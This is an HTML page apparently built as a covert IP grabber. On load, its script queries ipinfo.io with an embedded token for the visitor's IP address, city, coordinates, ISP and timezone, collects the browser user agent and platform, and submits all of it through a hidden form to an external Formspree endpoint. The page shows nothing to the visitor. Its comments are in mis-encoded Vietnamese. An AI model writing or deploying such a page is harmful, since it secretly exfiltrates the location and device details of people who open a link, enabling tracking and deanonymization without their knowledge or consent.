<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Log IP + Device Info</title>
</head>
<body>
  <form id="ipForm" action="https://formspree.io/f/xovwnjya" method="POST" style="display:none;">
    <input type="hidden" name="ip_info" id="ipInfo">
  </form>

  <script>
    async function getInfo() {
      try {
        // G·ªçi ipinfo.io ‚Äì d·ªãch v·ª• ·ªïn ƒë·ªãnh, kh√¥ng c·∫ßn token (cho request ƒë∆°n l·∫ª)
        const res = await fetch('https://ipinfo.io/json?token=ce4f3e1e92a582'); // Token public mi·ªÖn ph√≠, c√≥ th·ªÉ thay n·∫øu mu·ªën
        const data = await res.json();

        const ip = data.ip || 'Unknown';
        const city = data.city || 'Unknown';
        const region = data.region || 'Unknown';
        const country = data.country || 'Unknown';
        const loc = data.loc || 'Unknown';
        const org = data.org || 'Unknown';
        const timezone = data.timezone || 'Unknown';
        const now = new Date().toLocaleString();

        const ua = navigator.userAgent;
        const platform = navigator.platform;

        const content = `
üîê IP Address: ${ip}

üìç Location:
- City: ${city}
- Region: ${region}
- Country: ${country}
- Coordinates: ${loc}
- ISP/Org: ${org}
- Timezone: ${timezone}

üíª Device:
- Platform: ${platform}
- User-Agent: ${ua}

üïí Time: ${now}
        `.trim();

        document.getElementById('ipInfo').value = content;
        document.getElementById('ipForm').submit();
      } catch (error) {
        console.error('Fetch IP info failed:', error);
      }
    }

    getInfo();
  </script>
</body>
</html>
